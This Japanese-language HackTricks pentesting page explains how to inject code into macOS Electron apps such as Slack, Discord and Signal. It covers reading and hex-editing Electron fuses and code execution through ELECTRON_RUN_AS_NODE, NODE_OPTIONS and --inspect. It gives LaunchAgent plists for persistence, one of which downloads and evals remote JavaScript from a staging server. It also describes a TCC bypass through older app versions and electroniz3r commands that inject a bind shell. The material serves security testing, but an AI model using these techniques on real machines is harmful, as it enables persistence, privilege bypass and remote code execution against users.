# macOS Electronアプリケーションのインジェクション

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 基本情報

Electronが何であるかわからない場合は、[**ここにたくさんの情報があります**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)。ただし、今のところ、Electronは**node**を実行することを知っておいてください。\
そして、nodeには、指定されたファイル以外のコードを実行するために使用できるいくつかの**パラメータ**と**環境変数**があります。

### Electron Fuses

これらのテクニックは次に説明しますが、最近のElectronでは、これらを**防ぐためのいくつかのセキュリティフラグ**が追加されています。これらは[**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses)であり、これらはmacOSのElectronアプリが**任意のコードを読み込むのを防ぐ**ために使用されます。

* **`RunAsNode`**: 無効にすると、コードをインジェクションするための環境変数**`ELECTRON_RUN_AS_NODE`**の使用を防ぎます。
* **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect`、`--inspect-brk`などのパラメータは無視されます。これにより、コードのインジェクションが防止されます。
* **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、ロードされた**`asar`**ファイルがmacOSによって検証されます。これにより、このファイルの内容を変更してコードをインジェクションすることが防止されます。
* **`OnlyLoadAppFromAsar`**: これが有効になっている場合、次の順序でロードする代わりに、**`app.asar`**、**`app`**、最後に**`default_app.asar`**を検索してロードします。したがって、**`embeddedAsarIntegrityValidation`**フューズと組み合わせると、検証されていないコードをロードすることは**不可能**です。
* **`LoadBrowserProcessSpecificV8Snapshot`**: 有効にすると、ブラウザプロセスはV8スナップショットに`browser_v8_context_snapshot.bin`という名前のファイルを使用します。

コードインジェクションを防止しないもう1つの興味深いフューズは次のとおりです。

* **EnableCookieEncryption**: 有効にすると、ディスク上のクッキーストアはOSレベルの暗号化キーを使用して暗号化されます。

### Electron Fusesの確認

アプリケーションからこれらのフラグを**確認**することができます。
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electronフューズの変更

[**ドキュメントによると**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)、**Electronフューズ**の設定は、**Electronバイナリ**内に設定されており、どこかに文字列**`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**が含まれています。

macOSアプリケーションでは、通常、`application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`にあります。
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
[https://hexed.it/](https://hexed.it/)でこのファイルをロードし、前の文字列を検索することができます。この文字列の後には、各ヒューズが無効または有効であることを示すASCIIの数字「0」または「1」が表示されます。ヒューズの値を変更するには、16進コード（`0x30`は`0`であり、`0x31`は`1`です）を変更します。

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

ただし、これらのバイトが変更された状態でアプリケーション内の**`Electron Framework`バイナリ**を上書きしようとすると、アプリが実行されなくなります。

## Electronアプリケーションへのコードの追加によるRCE

Electronアプリが使用している**外部のJS/HTMLファイル**が存在する場合、攻撃者はこれらのファイルにコードを注入し、その署名がチェックされずにアプリのコンテキストで任意のコードを実行することができます。

{% hint style="danger" %}
ただし、現時点では2つの制限があります：

* アプリを変更するには**`kTCCServiceSystemPolicyAppBundles`**パーミッションが必要です。したがって、デフォルトではこれは不可能になりました。
* コンパイルされた**`asap`**ファイルには通常、ヒューズ**`embeddedAsarIntegrityValidation`**と**`onlyLoadAppFromAsar`**が有効になっています。

これにより、この攻撃経路はより複雑になります（または不可能になります）。
{% endhint %}

**`kTCCServiceSystemPolicyAppBundles`**の要件をバイパスすることも可能であり、アプリケーションを別のディレクトリ（たとえば**`/tmp`**）にコピーし、フォルダ**`app.app/Contents`**を**`app.app/NotCon`**に名前を変更し、**悪意のある**コードで**asar**ファイルを変更し、それを**`app.app/Contents`**に戻し、実行することができます。

## `ELECTRON_RUN_AS_NODE`によるRCE <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**ドキュメント**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node)によると、この環境変数が設定されている場合、プロセスは通常のNode.jsプロセスとして開始されます。

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
もしfuse **`RunAsNode`**が無効になっている場合、環境変数**`ELECTRON_RUN_AS_NODE`**は無視され、これは機能しません。
{% endhint %}

### アプリのPlistからのインジェクション

[**ここで提案されているように**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)、この環境変数をplistに悪用することで持続性を維持することができます：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS`を使用したRCE

異なるファイルにペイロードを保存し、実行することができます：

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
もし、fuse **`EnableNodeOptionsEnvironmentVariable`** が **無効** になっている場合、アプリは起動時に環境変数 **NODE\_OPTIONS** を **無視** します。ただし、環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されている場合は、それも **無視** されます。なお、fuse **`RunAsNode`** も無効になっている場合は、同様に **無視** されます。
{% endhint %}

### アプリの Plist からのインジェクション

この環境変数を plist に悪用することで、以下のキーを追加して持続性を確保することができます：
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## インスペクトによるRCE

[**こちら**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)によると、Electronアプリケーションを**`--inspect`**、**`--inspect-brk`**、**`--remote-debugging-port`**などのフラグを使用して実行すると、**デバッグポートが開かれ**、それに接続することができます（たとえば、`chrome://inspect`のChromeから）。そして、それに対して**コードを注入**したり、新しいプロセスを起動したりすることができます。\
例えば：

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
もしfuse**`EnableNodeCliInspectArguments`**が無効になっている場合、アプリは起動時に`--inspect`のようなノードパラメータを**無視**します。ただし、環境変数**`ELECTRON_RUN_AS_NODE`**が設定されている場合は、それも**無視**されます。fuse**`RunAsNode`**も無効になっている場合は、前述の環境変数も無効になります。

ただし、引き続きelectronパラメータ`--remote-debugging-port=9229`を使用することはできますが、前述のペイロードは他のプロセスを実行するためには機能しません。
{% endhint %}

### アプリのPlistからのインジェクション

これらのキーを追加して持続性を維持するために、この環境変数をplistで悪用することができます：
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCCバイパス：古いバージョンの悪用

{% hint style="success" %}
macOSのTCCデーモンは、実行されるアプリケーションのバージョンをチェックしません。したがって、前述のいずれの技術でもElectronアプリケーションにコードをインジェクトできない場合は、以前のバージョンのアプリをダウンロードし、それにコードをインジェクトすることができます。これにより、TCCの特権を取得できます。
{% endhint %}

## 自動インジェクション

ツール[**electroniz3r**](https://github.com/r3ggi/electroniz3r)は、インストールされている脆弱なElectronアプリケーションを見つけ、それらにコードをインジェクトするために簡単に使用できます。このツールは、**`--inspect`** 技術を使用しようとします。

自分でコンパイルする必要があり、次のように使用できます：
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## 参考文献

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
